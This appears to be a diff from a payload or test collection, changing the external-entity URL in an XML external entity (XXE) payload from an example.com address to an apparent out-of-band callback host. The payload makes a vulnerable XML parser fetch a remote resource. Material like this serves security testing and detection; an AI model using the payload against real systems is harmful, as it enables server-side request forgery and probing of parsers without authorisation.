@@ -1,4 +1,4 @@
 <?xml version="1.0"?>
 <!DOCTYPE foo [  
 <!ELEMENT foo (#ANY)>
-<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
+<!ENTITY xxe SYSTEM "https://xxe.webhooks.pw/text.txt">]><foo>&xxe;</foo>
